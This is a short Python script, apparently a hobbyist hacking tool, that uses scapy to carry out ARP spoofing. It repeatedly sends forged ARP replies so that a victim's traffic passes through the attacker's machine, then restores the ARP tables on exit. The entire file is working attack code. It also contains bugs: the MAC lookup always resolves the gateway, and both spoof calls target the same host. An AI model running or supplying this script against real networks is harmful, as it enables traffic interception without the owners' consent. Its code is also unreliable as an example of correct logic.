#!/usr/bin/env python3

import scapy.all as scapy
import time
import argparse


def get_arguments():
    parser = argparse.ArgumentParser()
    parser.add_argument('-g', '--gateway', dest='gateway_ip', help='Give the ip of the target gateway')
    parser.add_argument('-v', '--victim', dest='victim_ip', help='Give the ip of the target to be spoofed')
    opts = parser.parse_args()
    return opts


def get_mac(ip):
    ip = get_arguments().gateway_ip
    arp_request = scapy.ARP(pdst=ip)
    broadcast = scapy.Ether(dst="ff:ff:ff:ff:ff:ff")
    arp_request_broadcast = broadcast / arp_request
    answered_list = scapy.srp(arp_request_broadcast, timeout=1, verbose=False)[0]
    return answered_list[0][1].hwsrc


def spoof(target_ip, spoof_ip):
    target_ip = get_arguments().victim_ip
    spoof_ip = get_arguments().gateway_ip
    target_mac = get_mac(target_ip)
    packet = scapy.ARP(op=2, pdst=target_ip, hwdst=target_mac, psrc=spoof_ip)
    scapy.send(packet, verbose=False)


def restore(destination_ip, source_ip):
    destination_ip = get_arguments().victim_ip
    source_ip = get_arguments().gateway_ip
    packet = scapy.ARP(op=2, pdst=destination_ip, hwdst=get_mac(destination_ip), psrc=source_ip, hwsrc=get_mac(source_ip))
    # print(packet.show())
    # print(packet.summary())
    scapy.send(packet, count=4, verbose=False)


options = get_arguments()
sent_packets_count = 0
try:
    while True:
        spoof(options.victim_ip, options.gateway_ip)
        spoof(options.gateway_ip, options.victim_ip)
        sent_packets_count = sent_packets_count + 2
        print('\r[+] Packets Sent: ' + str(sent_packets_count), end='')
        time.sleep(2)
except KeyboardInterrupt:
    print('\n[+] Detected keyboard interruption........Quitting')
    print('Total sent packets: '+str(sent_packets_count))
    restore(options.victim_ip, options.gateway_ip)
